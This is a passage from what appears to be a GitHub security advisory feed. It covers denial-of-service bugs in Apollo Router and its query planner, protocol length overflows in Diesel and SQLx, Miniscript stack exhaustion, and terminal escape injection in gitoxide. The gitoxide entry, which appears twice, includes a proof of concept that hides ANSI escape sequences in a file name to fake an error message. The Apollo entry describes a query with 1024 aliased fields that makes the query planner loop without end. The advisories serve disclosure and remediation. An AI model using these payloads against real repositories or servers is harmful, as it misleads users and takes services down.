<h3 id="when-using-external-coprocessing">When using External Coprocessing:</h3>
<p>Instances of the Apollo Router running versions &gt;=1.21.0 and &lt;1.52.1 are impacted by a denial-of-service vulnerability if <strong>all</strong> of the following are true:</p>
<ol>
<li>Router has been configured to support External Coprocessing.</li>
<li>Router has been configured to send request bodies to coprocessors. This is a non-default configuration and must be configured intentionally by administrators.</li>
</ol>
<p>You can identify if you are impacted by reviewing your router's configuration YAML for the following config:</p>
<pre><code class="language-yaml">...
coprocessor:
  url: http://localhost:9000 # likely different in your environment
  router:
    request:
      body: true # this must be set to 'true' to be impacted
...
</code></pre>
<p>External Coprocessing was initially made available as an experimental feature with <a href="https://github.com/apollographql/router/releases/tag/v1.21.0">Router version 1.21.0</a> on 2023-06-20 and was made generally available with <a href="https://github.com/apollographql/router/releases/tag/v1.38.0">Router version 1.38.0</a> on 2024-01-19. More information about the Router’s <a href="https://www.apollographql.com/docs/router/customizations/coprocessor">External Coprocessing feature is available here</a>.</p>
<h3 id="when-using-native-rust-plugins">When using Native Rust Plugins:</h3>
<p>Instances of the Apollo Router running versions &gt;=1.7.0 and &lt;1.52.1 are impacted by a denial-of-service vulnerability if <strong>all</strong> of the following are true:</p>
<ol>
<li>Router has been configured to use a custom-developed Native Rust Plugin</li>
<li>The plugin accesses <code>Request.router_request</code> in the <code>RouterService</code> layer</li>
<li>You are accumulating the body from <code>Request.router_request</code> into memory</li>
</ol>
<p>To use a plugin, you need to be running a customized Router binary. Additionally, you need to have a <code>plugins</code> section with at least one plugin defined in your Router’s configuration YAML. That plugin would also need to define a custom <code>router_service</code> method.</p>
<p>You can check for a defined plugin by reviewing for the following in your Router’s configuration YAML:</p>
<pre><code class="language-yaml">...
plugins:
    custom_plugin_name:
        # custom config here
...
</code></pre>
<p>You can check for a custom <code>router_service</code> method in a plugin, by reviewing for the following function signature in your plugin’s source:</p>
<pre><code class="language-rust">fn router_service(&amp;self, service: router::BoxService) -&gt; router::BoxService
</code></pre>
<p>More information about the Router’s <a href="https://www.apollographql.com/docs/router/customizations/native">Native Rust Plugin feature is available here</a>.</p>
<h2 id="impact-detail">Impact Detail</h2>
<p>If using an impacted configuration, the Router will load entire HTTP request bodies into memory without respect to other HTTP request size-limiting configurations like <code>limits.http_max_request_bytes</code>. This can cause the Router to be out-of-memory (OOM) terminated if a sufficiently large request is sent to the Router.</p>
<p>By default, the Router sets <code>limits.http_max_request_bytes</code> to 2 MB. More information about the Router’s <a href="https://www.apollographql.com/docs/router/configuration/overview/#request-limits">request limiting features is available here</a>.</p>
<h2 id="patches">Patches</h2>
<p><a href="https://github.com/apollographql/router/releases/tag/v1.52.1">Apollo Router 1.52.1</a></p>
<p>If you have an impacted configuration as defined above, please upgrade to at least Apollo Router 1.52.1.</p>
<h2 id="workarounds">Workarounds</h2>
<p>If you cannot upgrade, you can mitigate the denial-of-service opportunity impacting External Coprocessors by setting the <code>coprocessor.router.request.body</code> configuration option to <code>false</code>. Please note that changing this configuration option will change the information sent to any coprocessors you have configured and may impact functionality implemented by those coprocessors. </p>
<p>If you have developed a Native Rust Plugin and cannot upgrade, you can update your plugin to either not accumulate the request body or enforce a maximum body size limit. </p>
<p>You can also mitigate this issue by limiting HTTP body payload sizes prior to the Router (e.g., in a proxy or web application firewall appliance).</p>
<h2 id="references">References</h2>
<p><a href="https://github.com/apollographql/router/releases/tag/v1.52.1">Apollo Router 1.52.1 Release Notes</a>
<a href="https://www.apollographql.com/docs/router/customizations/coprocessor">External Coprocessing documentation</a>
<a href="https://www.apollographql.com/docs/router/configuration/overview/#request-limits">HTTP Request Limiting documentation</a>
<a href="https://www.apollographql.com/docs/router/customizations/native">Native Rust Plugin documentation</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/apollographql/router/security/advisories/GHSA-x6xq-whh3-gg32">https://github.com/apollographql/router/security/advisories/GHSA-x6xq-whh3-gg32</a></li>
<li><a href="https://github.com/apollographql/router/commit/7a9c020608a62dcaa306b72ed0f6980f15923b14">https://github.com/apollographql/router/commit/7a9c020608a62dcaa306b72ed0f6980f15923b14</a></li>
<li><a href="https://github.com/apollographql/router/releases/tag/v1.52.1">https://github.com/apollographql/router/releases/tag/v1.52.1</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43783">https://nvd.nist.gov/vuln/detail/CVE-2024-43783</a></li>
<li><a href="https://www.apollographql.com/docs/router/configuration/overview/#request-limits">https://www.apollographql.com/docs/router/configuration/overview/#request-limits</a></li>
<li><a href="https://www.apollographql.com/docs/router/customizations/coprocessor">https://www.apollographql.com/docs/router/customizations/coprocessor</a></li>
<li><a href="https://www.apollographql.com/docs/router/customizations/native">https://www.apollographql.com/docs/router/customizations/native</a></li>
<li><a href="https://github.com/advisories/GHSA-x6xq-whh3-gg32">https://github.com/advisories/GHSA-x6xq-whh3-gg32</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-x6xq-whh3-gg32</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-27T18:14:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apollo-router] Apollo Query Planner and Apollo Gateway may infinitely loop on sufficiently complex queries]]></title>
        <id>https://github.com/advisories/GHSA-fmj9-77q8-g6c4</id>
        <link href="https://github.com/advisories/GHSA-fmj9-77q8-g6c4"/>
        <updated>2024-08-27T18:14:13.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Instances of @apollo/query-planner &gt;=2.0.0 and &lt;2.8.5 are impacted by a denial-of-service vulnerability. @apollo/gateway versions &gt;=2.0.0 and &lt; 2.8.5 and Apollo Router &lt;1.52.1 are also impacted through their use of @apollo/query-planner. </p>
<p>If @apollo/query-planner is asked to plan a sufficiently complex query, it may loop infinitely and never complete. This results in unbounded memory consumption and either a crash or out-of-memory (OOM) termination.</p>
<p>This issue can be triggered if you have at least one non-<code>@key</code> field that can be resolved by multiple subgraphs. To identify these shared fields, the schema for each subgraph must be reviewed. The mechanism to identify shared fields varies based on the version of Federation your subgraphs are using.</p>
<p>You can check if your subgraphs are using Federation 1 or Federation 2 by reviewing their schemas. Federation 2 subgraph schemas will contain a <code>@link</code> directive referencing the version of Federation being used while Federation 1 subgraphs will not. For example, in a Federation 2 subgraph, you will find a line like <code>@link(url: "https://specs.apollo.dev/federation/v2.0")</code>. If a similar <code>@link</code> directive is not present in your subgraph schema, it is using Federation 1. Note that a supergraph can contain a mix of Federation 1 and Federation 2 subgraphs.</p>
<p><strong>To review Federation 1 subgraphs for impact:</strong></p>
<p>In Federation 1 subgraphs, fields are implicitly shareable across subgraphs. To review for impact, you will need to review for cases where multiple subgraphs can resolve the same field. For example: </p>
<pre><code class="language-graphql"># Subgraph 1
type Query {
  field: Int
}

# Subgraph 2
type Query {
  field: Int
}
</code></pre>
<p><strong>To review Federation 2 subgraphs for impact:</strong></p>
<p>In Federation 2 subgraphs, fields must be explicitly defined as shareable across subgraphs. This is done via the <code>@shareable</code> directive. For example:</p>
<pre><code class="language-graphql"># Subgraph 1
@link(url: "https://specs.apollo.dev/federation/v2.0")
type Query {
  field: Int @shareable
}

# Subgraph 2
@link(url: "https://specs.apollo.dev/federation/v2.0")
type Query {
  field: Int @shareable
}
</code></pre>
<h3 id="impact-detail">Impact Detail</h3>
<p>This issue results from the Apollo query planner attempting to use a <code>Number</code> exceeding Javascript’s <code>Number.MAX_VALUE</code> in some cases. In Javascript, <code>Number.MAX_VALUE</code> is (2^1024 - 2^971).</p>
<p>When the query planner receives an inbound graphql request, it breaks the query into pieces and for each piece, generates a list of potential execution steps to solve the piece. These candidates represent the steps that the query planner will take to satisfy the pieces of the larger query. As part of normal operations, the query planner requires and calculates the number of possible query plans for the total query. That is, it needs the product of the number of query plan candidates for each piece of the query. Under normal circumstances, after generating all query plan candidates and calculating the number of all permutations, the query planner moves on to stack rank candidates and prune less-than-optimal options. </p>
<p>In particularly complex queries, especially those where fields can be solved through multiple subgraphs, this can cause the number of all query plan permutations to balloon. In worst-case scenarios, this can end up being a number larger than <code>Number.MAX_VALUE</code>. In Javascript, if <code>Number.MAX_VALUE</code> is exceeded, Javascript represents the value as “infinity”. If the count of candidates is evaluated as infinity, the component of the query planner responsible for pruning less-than-optimal query plans does not actually prune candidates, causing the query planner to evaluate many orders of magnitude more query plan candidates than necessary.</p>
<p>A given graph’s exposure to this issue varies based on its complexity. Consider the following Federation 2 subgraphs: </p>
<pre><code class="language-graphql"># Subgraph 1
type Query {
  field: Int @shareable
}

# Subgraph 2
type Query {
  field: Int @shareable
}
</code></pre>
<p>The query planner can solve requests for <code>Query.field</code> in one of two ways - either by querying subgraph 1 or subgraph 2. </p>
<p>The following query with 1024 aliased fields would trigger this issue because 2^1024 &gt; <code>Number.MAX_VALUE</code>:  </p>
<pre><code class="language-graphql">query {
  field_1: field
  field_2: field
  # ...
  field_1023: field
  field_1024: field
}
</code></pre>
<p>However, in a graph that provided 5 options to solve a given field, the bug could be encountered in a query that aliased the field approximately 440 times.</p>
<h3 id="patches">Patches</h3>
<p>@apollo/query-planner 2.8.5
@apollo/gateway 2.8.5
Apollo Router 1.52.1</p>
<h3 id="workarounds">Workarounds</h3>
<p>This issue can be avoided by ensuring there are no fields resolvable from multiple subgraphs. If all subgraphs are using Federation 2, you can confirm that you are not impacted by ensuring that none of your subgraph schemas use the <code>@shareable</code> directive. If you are using Federation 1 subgraphs, you will need to validate that there are no fields resolvable by multiple subgraphs. </p>
<p>Note that a supergraph can contain a mix of Federation 1 and Federation 2 subgraphs. </p>
<p>If you do have fields resolvable by multiple subgraphs, changing this behavior in response to this issue may be risky to the operation of your supergraph. We recommend that you update to a patched version of either Apollo Router or Apollo Gateway.</p>
<p>Apollo customers with an enterprise entitlement using the Apollo Router can also mitigate much of the risk from this issue by implementing <a href="https://www.apollographql.com/docs/router/configuration/persisted-queries">Apollo’s Persisted Queries (PQ) feature</a>. With PQ enabled, the Apollo Router will only execute safelisted queries. While customers would need to ensure that queries that induce this issue are not added to the safelist, PQs would mitigate the risk of clients submitting ad hoc queries that exploit this issue.</p>
<h3 id="references">References</h3>
<p><a href="https://www.apollographql.com/docs/federation/query-plans/">Additional information on Query Plans</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/apollographql/federation/security/advisories/GHSA-fmj9-77q8-g6c4">https://github.com/apollographql/federation/security/advisories/GHSA-fmj9-77q8-g6c4</a></li>
<li><a href="https://github.com/apollographql/router/commit/e309c9bb5a48c1304ff69c88b7eabdd08c26bf45">https://github.com/apollographql/router/commit/e309c9bb5a48c1304ff69c88b7eabdd08c26bf45</a></li>
<li><a href="https://www.apollographql.com/docs/federation/query-plans">https://www.apollographql.com/docs/federation/query-plans</a></li>
<li><a href="https://www.apollographql.com/docs/router/configuration/persisted-queries">https://www.apollographql.com/docs/router/configuration/persisted-queries</a></li>
<li><a href="https://github.com/advisories/GHSA-fmj9-77q8-g6c4">https://github.com/advisories/GHSA-fmj9-77q8-g6c4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fmj9-77q8-g6c4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-27T18:14:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[diesel] Diesel vulnerable to Binary Protocol Misinterpretation caused by Truncating or Overflowing Casts]]></title>
        <id>https://github.com/advisories/GHSA-wq9x-qwcq-mmgf</id>
        <link href="https://github.com/advisories/GHSA-wq9x-qwcq-mmgf"/>
        <updated>2024-08-23T18:51:21.000Z</updated>
        <content type="html"><![CDATA[<p>The following presentation at this year's DEF CON was brought to our attention on the Diesel Gitter Channel:</p>
<blockquote>
<p>SQL Injection isn't Dead: Smuggling Queries at the Protocol Level<br><a href="http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf">http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf</a><br>(Archive link for posterity.)
Essentially, encoding a value larger than 4GiB can cause the length prefix in the protocol to overflow, 
causing the server to interpret the rest of the string as binary protocol commands or other data.</p>
</blockquote>
<p>It appears Diesel <em>does</em> perform truncating casts in a way that could be problematic, 
for example: <a href="https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36">https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36</a></p>
<p>This code has existed essentially since the beginning, 
so it is reasonable to assume that all published versions <code>&lt;= 2.2.2</code> are affected.</p>
<h2 id="mitigation">Mitigation</h2>
<p>The prefered migration to the outlined problem is to update to a Diesel version newer than 2.2.2, which includes 
fixes for the problem. </p>
<p>As always, you should make sure your application is validating untrustworthy user input. 
Reject any input over 4 GiB, or any input that could <em>encode</em> to a string longer than 4 GiB. 
Dynamically built queries are also potentially problematic if it pushes the message size over this 4 GiB bound.</p>
<p>For web application backends, consider adding some middleware that limits the size of request bodies by default.</p>
<h2 id="resolution">Resolution</h2>
<p>Diesel now uses <code>#[deny]</code> directives for the following Clippy lints:</p>
<ul>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_possible_truncation"><code>cast_possible_truncation</code></a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_possible_wrap"><code>cast_possible_wrap</code></a></li>
<li><a href="https://rust-lang.github.io/rust-clippy/master/#/cast_sign_loss"><code>cast_sign_loss</code></a></li>
</ul>
<p>to prevent casts that will lead to precision loss or other trunctations. Additionally we performed an 
audit of the relevant code.</p>
<p>A fix is included in the <code>2.2.3</code> release.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/diesel-rs/diesel/pull/4170">https://github.com/diesel-rs/diesel/pull/4170</a></li>
<li><a href="https://github.com/diesel-rs/diesel/commit/9eccd7d6d705ac53618bfd478152e32ec3b4536c">https://github.com/diesel-rs/diesel/commit/9eccd7d6d705ac53618bfd478152e32ec3b4536c</a></li>
<li><a href="https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36">https://github.com/diesel-rs/diesel/blob/ae82c4a5a133db65612b7436356f549bfecda1c7/diesel/src/pg/connection/stmt/mod.rs#L36</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0365.html">https://rustsec.org/advisories/RUSTSEC-2024-0365.html</a></li>
<li><a href="https://github.com/advisories/GHSA-wq9x-qwcq-mmgf">https://github.com/advisories/GHSA-wq9x-qwcq-mmgf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wq9x-qwcq-mmgf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-23T18:51:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitoxide-core] gitoxide-core does not neutralize special characters for terminals]]></title>
        <id>https://github.com/advisories/GHSA-88g2-r9rw-g55h</id>
        <link href="https://github.com/advisories/GHSA-88g2-r9rw-g55h"/>
        <updated>2024-08-23T13:42:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>gix</code> and <code>ein</code> commands write pathnames and other metadata literally to terminals, even if they contain characters terminals treat specially, including ANSI escape sequences. This sometimes allows an untrusted repository to misrepresent its contents and to alter or concoct error messages.</p>
<h3 id="details">Details</h3>
<p><code>gitoxide-core</code>, which provides most underlying functionality of the <code>gix</code> and <code>ein</code> commands, does not neutralize newlines, backspaces, or control characters—including those that form ANSI escape sequences—that appear in a repository's paths, author and committer names, commit messages, or other metadata. Such text may be written as part of the output of a command, as well as appearing in error messages when an operation fails.</p>
<p>ANSI escape sequences are of particular concern because, when printed to a terminal, they can change colors, including to render subsequent text unreadable; reposition the cursor to write text in a different location, including where text has already been written; clear the terminal; set the terminal title-bar text to arbitrary values; render the terminal temporarily unusable; and other such operations.</p>
<p>The effect is mostly an annoyance. But the author of a malicious repository who can predict how information from the repository may be accessed can cause files in the repository to be concealed or otherwise misrepresented, as well as rewrite all or part of error messages, or mimic error messages convincingly by repositioning the cursor and writing colored text.</p>
<h3 id="poc">PoC</h3>
<p>On a Unix-like system in a POSIX-compatible shell, run:</p>
<pre><code class="language-sh">git init misleading-path
cd misleading-path
touch "$(printf '\033]0;Boo!\007\033[2K\r\033[91mError: Repository is corrupted. Run \033[96mEVIL_COMMAND\033[91m to attempt recovery.\033[0m')"
git add .
git commit -m 'Initial commit'
</code></pre>
<p>In the repository—or, if desired, in a clone of it, to show that this is exploitable by getting a user to clone an untrusted repository—run this command, which outputs entries in a three-column form showing type, hash, and filename:</p>
<pre><code class="language-sh">gix tree entries
</code></pre>
<p>Although the output is of that form, it does not appear to be. Instead, the output in a terminal looks like this, colorized to appear to be an error message, with <code>EVIL_COMMAND</code> in another color, and with no other text:</p>
<pre><code class="language-text">Error: Repository is corrupted. Run EVIL_COMMAND to attempt recovery.
</code></pre>
<p>In some terminals, a beep or other sound will be made. In most terminals, the title bar text will be changed to <code>Boo!</code>, though in some shells this may be immediately undone when printing the prompt. These elements are included to showcase the abilities of ANSI escape sequences, but they are not usually themselves threats.</p>
<p>To see what is actually produced, <code>gix tree entries</code> can be piped to a command that displays special characters symbolically, such as <code>less</code> or <code>cat -v</code> if available.</p>
<pre><code class="language-text">BLOB e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 ESC]0;Boo!^GESC[2K^MESC[91mError: Repository is corrupted. Run ESC[96mEVIL_COMMANDESC[91m to attempt recovery.ESC[0m
</code></pre>
<p>That shows the effect on <code>gix tree entries</code>, but various other commands are also affected, and the escape sequences and other special characters can also appear in non-path metadata, such as in the <code>user.name</code> used to create a commit.</p>
<h3 id="impact">Impact</h3>
<p>For users who do not clone or operate in clones of untrusted repositories, there is no impact.</p>
<p>Windows is much less affected than Unix-like systems due to limitations on what characters can appear in filenames, and because traditionally Windows terminals do not support as many ANSI escape sequences.</p>
<p>Because different <code>gix</code> and <code>ein</code> commands display different data in different formats, the author of a malicious repository must guess how it will be used, which complicates crafting truly convincing output, though it may be possible to craft a repository where <code>gix clone</code> fails to clone it but produces a misleading message.</p>
<p>Although this is mainly exploitable on systems <em>other</em> than Windows, in the ability to produce misleading output this superficially resembles CVE-2024-35197. But this is much more limited, because:</p>
<ul>
<li>The misleading output can only be made to go where the application is already sending output. Redirection is not defeated, and devices to access cannot be chosen by the attacker.</li>
<li>The misleading output can only be take place <em>when</em> the application is already producing output. This limitation complicates the production of believable messages.</li>
<li>Only terminals are affected. Even if a standard stream is redirected to another file or device, these special characters would not have a special effect, unless echoed later without sanitization.</li>
<li>Reading and blocking cannot be performed.</li>
<li>Applications other than the gitoxide <code>gix</code> and <code>ein</code> executables are unaffected. The exception is if another application uses <code>gitoxide-core</code>. But this is explicitly discouraged in the <code>gitoxide-core</code> documentation and is believed to be rare.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/security/advisories/GHSA-88g2-r9rw-g55h">https://github.com/Byron/gitoxide/security/advisories/GHSA-88g2-r9rw-g55h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43785">https://nvd.nist.gov/vuln/detail/CVE-2024-43785</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0364.html">https://rustsec.org/advisories/RUSTSEC-2024-0364.html</a></li>
<li><a href="https://github.com/advisories/GHSA-88g2-r9rw-g55h">https://github.com/advisories/GHSA-88g2-r9rw-g55h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-88g2-r9rw-g55h</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-22T16:41:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gitoxide] gitoxide-core does not neutralize special characters for terminals]]></title>
        <id>https://github.com/advisories/GHSA-88g2-r9rw-g55h</id>
        <link href="https://github.com/advisories/GHSA-88g2-r9rw-g55h"/>
        <updated>2024-08-23T13:42:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The <code>gix</code> and <code>ein</code> commands write pathnames and other metadata literally to terminals, even if they contain characters terminals treat specially, including ANSI escape sequences. This sometimes allows an untrusted repository to misrepresent its contents and to alter or concoct error messages.</p>
<h3 id="details">Details</h3>
<p><code>gitoxide-core</code>, which provides most underlying functionality of the <code>gix</code> and <code>ein</code> commands, does not neutralize newlines, backspaces, or control characters—including those that form ANSI escape sequences—that appear in a repository's paths, author and committer names, commit messages, or other metadata. Such text may be written as part of the output of a command, as well as appearing in error messages when an operation fails.</p>
<p>ANSI escape sequences are of particular concern because, when printed to a terminal, they can change colors, including to render subsequent text unreadable; reposition the cursor to write text in a different location, including where text has already been written; clear the terminal; set the terminal title-bar text to arbitrary values; render the terminal temporarily unusable; and other such operations.</p>
<p>The effect is mostly an annoyance. But the author of a malicious repository who can predict how information from the repository may be accessed can cause files in the repository to be concealed or otherwise misrepresented, as well as rewrite all or part of error messages, or mimic error messages convincingly by repositioning the cursor and writing colored text.</p>
<h3 id="poc">PoC</h3>
<p>On a Unix-like system in a POSIX-compatible shell, run:</p>
<pre><code class="language-sh">git init misleading-path
cd misleading-path
touch "$(printf '\033]0;Boo!\007\033[2K\r\033[91mError: Repository is corrupted. Run \033[96mEVIL_COMMAND\033[91m to attempt recovery.\033[0m')"
git add .
git commit -m 'Initial commit'
</code></pre>
<p>In the repository—or, if desired, in a clone of it, to show that this is exploitable by getting a user to clone an untrusted repository—run this command, which outputs entries in a three-column form showing type, hash, and filename:</p>
<pre><code class="language-sh">gix tree entries
</code></pre>
<p>Although the output is of that form, it does not appear to be. Instead, the output in a terminal looks like this, colorized to appear to be an error message, with <code>EVIL_COMMAND</code> in another color, and with no other text:</p>
<pre><code class="language-text">Error: Repository is corrupted. Run EVIL_COMMAND to attempt recovery.
</code></pre>
<p>In some terminals, a beep or other sound will be made. In most terminals, the title bar text will be changed to <code>Boo!</code>, though in some shells this may be immediately undone when printing the prompt. These elements are included to showcase the abilities of ANSI escape sequences, but they are not usually themselves threats.</p>
<p>To see what is actually produced, <code>gix tree entries</code> can be piped to a command that displays special characters symbolically, such as <code>less</code> or <code>cat -v</code> if available.</p>
<pre><code class="language-text">BLOB e69de29bb2d1d6434b8b29ae775ad8c2e48c5391 ESC]0;Boo!^GESC[2K^MESC[91mError: Repository is corrupted. Run ESC[96mEVIL_COMMANDESC[91m to attempt recovery.ESC[0m
</code></pre>
<p>That shows the effect on <code>gix tree entries</code>, but various other commands are also affected, and the escape sequences and other special characters can also appear in non-path metadata, such as in the <code>user.name</code> used to create a commit.</p>
<h3 id="impact">Impact</h3>
<p>For users who do not clone or operate in clones of untrusted repositories, there is no impact.</p>
<p>Windows is much less affected than Unix-like systems due to limitations on what characters can appear in filenames, and because traditionally Windows terminals do not support as many ANSI escape sequences.</p>
<p>Because different <code>gix</code> and <code>ein</code> commands display different data in different formats, the author of a malicious repository must guess how it will be used, which complicates crafting truly convincing output, though it may be possible to craft a repository where <code>gix clone</code> fails to clone it but produces a misleading message.</p>
<p>Although this is mainly exploitable on systems <em>other</em> than Windows, in the ability to produce misleading output this superficially resembles CVE-2024-35197. But this is much more limited, because:</p>
<ul>
<li>The misleading output can only be made to go where the application is already sending output. Redirection is not defeated, and devices to access cannot be chosen by the attacker.</li>
<li>The misleading output can only be take place <em>when</em> the application is already producing output. This limitation complicates the production of believable messages.</li>
<li>Only terminals are affected. Even if a standard stream is redirected to another file or device, these special characters would not have a special effect, unless echoed later without sanitization.</li>
<li>Reading and blocking cannot be performed.</li>
<li>Applications other than the gitoxide <code>gix</code> and <code>ein</code> executables are unaffected. The exception is if another application uses <code>gitoxide-core</code>. But this is explicitly discouraged in the <code>gitoxide-core</code> documentation and is believed to be rare.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Byron/gitoxide/security/advisories/GHSA-88g2-r9rw-g55h">https://github.com/Byron/gitoxide/security/advisories/GHSA-88g2-r9rw-g55h</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43785">https://nvd.nist.gov/vuln/detail/CVE-2024-43785</a></li>
<li><a href="https://rustsec.org/advisories/RUSTSEC-2024-0364.html">https://rustsec.org/advisories/RUSTSEC-2024-0364.html</a></li>
<li><a href="https://github.com/advisories/GHSA-88g2-r9rw-g55h">https://github.com/advisories/GHSA-88g2-r9rw-g55h</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-88g2-r9rw-g55h</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-22T16:41:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[miniscript] Miniscript allows stack consumption]]></title>
        <id>https://github.com/advisories/GHSA-rv9v-r4vm-gj8x</id>
        <link href="https://github.com/advisories/GHSA-rv9v-r4vm-gj8x"/>
        <updated>2024-08-21T17:50:04.000Z</updated>
        <content type="html"><![CDATA[<p>The Miniscript (aka rust-miniscript) library before 12.2.0 for Rust allows stack consumption because it does not properly track tree depth.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-44073">https://nvd.nist.gov/vuln/detail/CVE-2024-44073</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/pull/704">https://github.com/rust-bitcoin/rust-miniscript/pull/704</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/pull/712">https://github.com/rust-bitcoin/rust-miniscript/pull/712</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/compare/11.2.0...12.2.0">https://github.com/rust-bitcoin/rust-miniscript/compare/11.2.0...12.2.0</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/commit/5b0f5e3417f027a22b066debf825dbe6644b575b">https://github.com/rust-bitcoin/rust-miniscript/commit/5b0f5e3417f027a22b066debf825dbe6644b575b</a></li>
<li><a href="https://github.com/rust-bitcoin/rust-miniscript/commit/8f54b5e3fb7129ed9fbed53f1cb9e6e62ea4c151">https://github.com/rust-bitcoin/rust-miniscript/commit/8f54b5e3fb7129ed9fbed53f1cb9e6e62ea4c151</a></li>
<li><a href="https://github.com/advisories/GHSA-rv9v-r4vm-gj8x">https://github.com/advisories/GHSA-rv9v-r4vm-gj8x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rv9v-r4vm-gj8x</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-19T03:30:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[sqlx] SQLx Binary Protocol Misinterpretation caused by Truncating or Overflowing Casts]]></title>
        <id>https://github.com/advisories/GHSA-xmrp-424f-vfpx</id>
        <link href="https://github.com/advisories/GHSA-xmrp-424f-vfpx"/>
        <updated>2024-08-19T16:02:08.000Z</updated>
        <content type="html"><![CDATA[<p>The following presentation at this year's DEF CON was brought to our attention on the SQLx Discord:</p>
<blockquote>
<p>SQL Injection isn't Dead: Smuggling Queries at the Protocol Level<br><a href="http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf">http://web.archive.org/web/20240812130923/https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Paul%20Gerste%20-%20SQL%20Injection%20Isn't%20Dead%20Smuggling%20Queries%20at%20the%20Protocol%20Level.pdf</a><br>(Archive link for posterity.)</p>
</blockquote>
<p>Essentially, encoding a value larger than 4GiB can cause the length prefix in the protocol to overflow, 
causing the server to interpret the rest of the string as binary protocol commands or other data.</p>
<p>It appears SQLx <em>does</em> perform truncating casts in a way that could be problematic, 
for example: <a href="https://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163">https://github.com/launchbadge/sqlx/blob/6f2905695b9606b5f51b40ce10af63ac9e696bb8/sqlx-postgres/src/arguments.rs#L163</a></p>
<p>This code has existed essentially since the beginning, 
so it is reasonable to assume that all published versions <code>&lt;= 0.8.0</code> are affected.</p>
<h2 id="mitigation">Mitigation</h2>
<p>As always, you should make sure your application is validating untrustworthy user input. 
Reject any input over 4 GiB, or any input that could <em>encode</em> to a string longer than 4 GiB. 
Dynamically built queries are also potentially problematic if it pushes the message size over this 4 GiB bound.</p>
<p><a href="https://docs.rs/sqlx/latest/sqlx/trait.Encode.html#method.size_hint"><code>Encode::size_hint()</code></a> 
can be used for sanity checks, but do not assume that the size returned is accurate. 
For example, the <code>Json&lt;T&gt;</code> and <code>Text&lt;T&gt;</code> adapters have no reasonable way to predict or estimate the final encoded size, 
so they just return <code>size_of::&lt;T&gt;()</code> instead.</p>
<p>For web application backends, consider adding some middleware that limits the size of request bodies by default.</p>
